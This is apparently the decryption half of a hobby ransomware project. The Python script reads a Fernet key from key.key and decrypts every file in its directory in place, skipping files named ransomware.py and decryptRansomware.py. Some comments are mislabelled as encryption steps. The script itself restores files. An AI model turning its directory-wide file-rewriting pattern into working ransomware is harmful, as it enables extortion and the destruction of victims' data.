import os 
from cryptography.fernet import Fernet 



files = []


# go to every file and folder in the current directory and add it to the list except for the ransomware.py file
for file in os.listdir():
    if file == 'ransomware.py' or file == 'key.key' or file == 'decryptRansomware.py':
        continue
    if os.path.isfile(file):
        files.append(file)


with open("key.key","rb") as key:
    secretkey = key.read()

# write binary
with open ('key.key', 'wb') as key_file:
    key_file.write(secretkey)  # Utiliser secretkey pour écrire les données dans le fichier key_file

for file in files:
    with open(file, 'rb') as thefile:
        data = thefile.read()
    data_decrypted = Fernet(secretkey).decrypt(data)
    # overwrite the file with its encrypted version
    with open(file, 'wb') as encrypted_file:  # Ouvrir le fichier en mode écriture binaire
        encrypted_file.write(data_decrypted)  # Utiliser encrypted_file pour écrire les données chiffrées

